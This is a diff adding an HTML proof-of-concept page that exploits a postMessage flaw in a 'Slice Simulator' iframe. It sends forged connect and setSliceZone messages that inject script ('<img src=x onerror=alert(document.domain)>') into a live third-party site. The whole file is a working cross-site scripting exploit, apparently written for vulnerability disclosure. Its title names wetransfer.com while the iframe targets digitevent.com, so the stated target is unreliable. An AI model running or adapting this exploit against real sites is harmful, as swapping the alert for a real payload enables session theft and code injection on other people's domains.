@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC - wetransfer.com XSS via Slice Simulator</title>
+</head>
+<body>
+  <h2>wetransfer.com XSS via Slice Simulator postMessage</h2>
+  <p id="status">Loading iframe...</p>
+  <pre id="result" style="background:#f0f0f0;padding:10px;max-height:400px;overflow:auto;display:none;"></pre>
+  <iframe id="target" src="https://www.digitevent.com/en/slice-simulator" style="width:100%;height:300px;border:1px solid #ccc;"></iframe>
+
+  <script>
+    const status = document.getElementById('status');
+    const iframe = document.getElementById('target');
+    const channel = new MessageChannel();
+
+    // Step 1: Listen for the "ready" request from the iframe
+    window.addEventListener('message', (e) => {
+      console.log('[PoC] Received message from iframe:', e.data);
+
+      if (!e.data || typeof e.data !== 'object') return;
+      if (!e.data.requestID || !e.data.type) return;
+
+      // The iframe sends a "ready" request
+      if (e.data.type === 'ready') {
+        status.textContent = 'Received "ready" request (ID: ' + e.data.requestID + '). Sending Connect + response...';
+        let readyRequestID = e.data.requestID;
+
+        // Step 2: Send Connect message with MessagePort
+        iframe.contentWindow.postMessage(
+          {
+            requestID: 'attacker-0',
+            type: 'connect',
+            data: {} // options to merge
+          },
+          '*',
+          [channel.port2]
+        );
+
+        // Step 3: Send response to the "ready" request through the port
+        // This resolves the ready() promise and sets _ready = true
+        setTimeout(() => {
+          channel.port1.postMessage({
+            requestID: readyRequestID,
+            status: 200,
+            msg: 'ok',
+            data: undefined
+          });
+          status.textContent = 'Sent ready response. Sending malicious slices...';
+
+          // Step 4: Send SetSliceZone with XSS payload via oembed embed node
+          setTimeout(() => {
+            channel.port1.postMessage({
+              requestID: 'attacker-1',
+              type: 'setSliceZone',
+              data: [
+                {
+                  id: 'xss-slice',
+                  slice_type: 'text_panel',
+                  primary: {
+                    body: [
+                      {
+                        type: 'embed',
+                        oembed: {
+                          embed_url: 'https://example.com',
+                          type: 'rich',
+                          provider_name: 'poc',
+                          html: '<img src=x onerror="alert(document.domain)">'
+                        }
+                      }
+                    ]
+                  },
+                  items: []
+                }
+              ]
+            });
+            status.textContent = 'Payload sent! Waiting for slice to render...';
+          }, 500);
+        }, 300);
+      }
+    });
+  </script>
+
+</body>
+</html>
+  
